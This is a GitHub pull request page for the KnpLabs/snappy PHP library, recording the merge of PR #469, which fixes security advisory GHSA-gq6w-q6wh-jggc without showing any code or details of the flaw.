* [Code](/KnpLabs/snappy)
* [Issues](/KnpLabs/snappy/issues)
* [Pull requests](/KnpLabs/snappy/pulls)
* [Discussions](/KnpLabs/snappy/discussions)
* [Actions](/KnpLabs/snappy/actions)
* [Projects](/KnpLabs/snappy/projects)
* [Security](/KnpLabs/snappy/security)
* [Insights](/KnpLabs/snappy/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FKnpLabs%2Fsnappy%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FKnpLabs%2Fsnappy%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# fix: security issue GHSA-gq6w-q6wh-jggc #469

 Merged

[AntoineLelaisant](/AntoineLelaisant)
merged 1 commit into
[master](/KnpLabs/snappy/tree/master "KnpLabs/snappy:master")
from
[fix/GHSA-gq6w-q6wh-jggc](/KnpLabs/snappy/tree/fix/GHSA-gq6w-q6wh-jggc "KnpLabs/snappy:fix/GHSA-gq6w-q6wh-jggc")

Mar 17, 2023

 Merged

# [fix: security issue GHSA-gq6w-q6wh-jggc](#top) #469

[AntoineLelaisant](/AntoineLelaisant)
merged 1 commit into
[master](/KnpLabs/snappy/tree/master "KnpLabs/snappy:master")
from
[fix/GHSA-gq6w-q6wh-jggc](/KnpLabs/snappy/tree/fix/GHSA-gq6w-q6wh-jggc "KnpLabs/snappy:fix/GHSA-gq6w-q6wh-jggc")

Mar 17, 2023

[Conversation
0](/KnpLabs/snappy/pull/469)
[Commits
1](/KnpLabs/snappy/pull/469/commits)
[Checks
0](/KnpLabs/snappy/pull/469/checks)
[Files changed](/KnpLabs/snappy/pull/469/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![AntoineLelaisant](https://avatars.githubusercontent.com/u/4592355?s=60&v=4)](/AntoineLelaisant)

Copy link

### @AntoineLelaisant **[AntoineLelaisant](/AntoineLelaisant)** commented [Mar 17, 2023](#issue-1629430584)

 *No description provided.*

Sorry, something went wrong.

All reactions

[![@AntoineLelaisant](https://avatars.githubusercontent.com/u/4592355?s=40&u=84c3b7eb4c9d510a40c165c9b4386565c15e048d&v=4)](/AntoineLelaisant)
[AntoineLelaisant](/AntoineLelaisant)
added
the
[security](/KnpLabs/snappy/labels/security)
label
[Mar 17, 2023](#event-8779146901)

`[fix: security issue](/KnpLabs/snappy/pull/469/commits/1ee6360cbdbea5d09705909a150df7963a88efd6 "fix: security issue GHSA-gq6w-q6wh-jggc") [GHSA-gq6w-q6wh-jggc](https://github.com/advisories/GHSA-gq6w-q6wh-jggc "GHSA-gq6w-q6wh-jggc")`

`[1ee6360](/KnpLabs/snappy/pull/469/commits/1ee6360cbdbea5d09705909a150df7963a88efd6)`

 [![@AntoineLelaisant](https://avatars.githubusercontent.com/u/4592355?s=40&u=84c3b7eb4c9d510a40c165c9b4386565c15e048d&v=4)](/AntoineLelaisant)
[AntoineLelaisant](/AntoineLelaisant)
[force-pushed](/KnpLabs/snappy/compare/6d56cfb2b0256ec169dd4dd3bc4bb1d77435861c..1ee6360cbdbea5d09705909a150df7963a88efd6)
the
fix/GHSA-gq6w-q6wh-jggc

branch
from
[`6d56cfb`](/KnpLabs/snappy/commit/6d56cfb2b0256ec169dd4dd3bc4bb1d77435861c) to
[`1ee6360`](/KnpLabs/snappy/commit/1ee6360cbdbea5d09705909a150df7963a88efd6)  [Compare](/KnpLabs/snappy/compare/6d56cfb2b0256ec169dd4dd3bc4bb1d77435861c..1ee6360cbdbea5d09705909a150df7963a88efd6)
[March 17, 2023 14:46](#event-8779228426)

[![qroques](https://avatars.githubusercontent.com/u/22145593?s=60&v=4)](/qroques)

**[qroques](/qroques)**
approved these changes
[Mar 17, 2023](#pullrequestreview-1346096862)

 [View reviewed changes](/KnpLabs/snappy/pull/469/files/1ee6360cbdbea5d09705909a150df7963a88efd6)

[![@AntoineLelaisant](https://avatars.githubusercontent.com/u/4592355?s=40&u=84c3b7eb4c9d510a40c165c9b4386565c15e048d&v=4)](/AntoineLelaisant)
[AntoineLelaisant](/AntoineLelaisant)
merged commit [`b66f793`](/KnpLabs/snappy/commit/b66f79334421c26d9c244427963fa2d92980b5d3)
into
master

[Mar 17, 2023](https://github.com/KnpLabs/snappy/pull/469#event-8779241038)

 [![@AntoineLelaisant](https://avatars.githubusercontent.com/u/4592355?s=40&u=84c3b7eb4c9d510a40c165c9b4386565c15e048d&v=4)](/AntoineLelaisant)
[AntoineLelaisant](/AntoineLelaisant)
deleted the
fix/GHSA-gq6w-q6wh-jggc

branch
[March 17, 2023 14:47](#event-8779241838)

[![@AntoineLelaisant](https://avatars.githubusercontent.com/u/4592355?s=40&u=84c3b7eb4c9d510a40c165c9b4386565c15e048d&v=4)](/AntoineLelaisant)
[AntoineLelaisant](/AntoineLelaisant)
mentioned this pull request
[Mar 17, 2023](#ref-issue-1570818182)

[How to get in touch regarding a security concern
#465](/KnpLabs/snappy/issues/465)

Closed

[![@PedroTroller](https://avatars.githubusercontent.com/u/1766827?s=40&u=97d86d4a140ee40c5961a4d4541ce58af7f8373b&v=4)](/PedroTroller)
[PedroTroller](/PedroTroller)
assigned [qroques](/qroques)
[Apr 5, 2023](#event-8934708887)

[![@PedroTroller](https://avatars.githubusercontent.com/u/1766827?s=40&u=97d86d4a140ee40c5961a4d4541ce58af7f8373b&v=4)](/PedroTroller)
[PedroTroller](/PedroTroller)
assigned [alexpozzi](/alexpozzi)
[Jan 14, 2025](#event-15923692473)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FKnpLabs%2Fsnappy%2Fpull%2F469)

Reviewers

[![@qroques](https://avatars.githubusercontent.com/u/22145593?s=40&v=4)](/qroques) [qroques](/qroques)

qroques approved these changes

Assignees

[![@alexpozzi](https://avatars.githubusercontent.com/u/8307861?s=40&v=4)](/alexpozzi) [alexpozzi](/alexpozzi)

[![@qroques](https://avatars.githubusercontent.com/u/22145593?s=40&v=4)](/qroques) [qroques](/qroques)

Labels

[security](/KnpLabs/snappy/labels/security)

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

3 participants

[![@AntoineLelaisant](https://avatars.githubusercontent.com/u/4592355?s=52&v=4)](/AntoineLelaisant) [![@qroques](https://avatars.githubusercontent.com/u/22145593?s=52&v=4)](/qroques) [![@alexpozzi](https://avatars.githubusercontent.com/u/8307861?s=52&v=4)](/alexpozzi)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


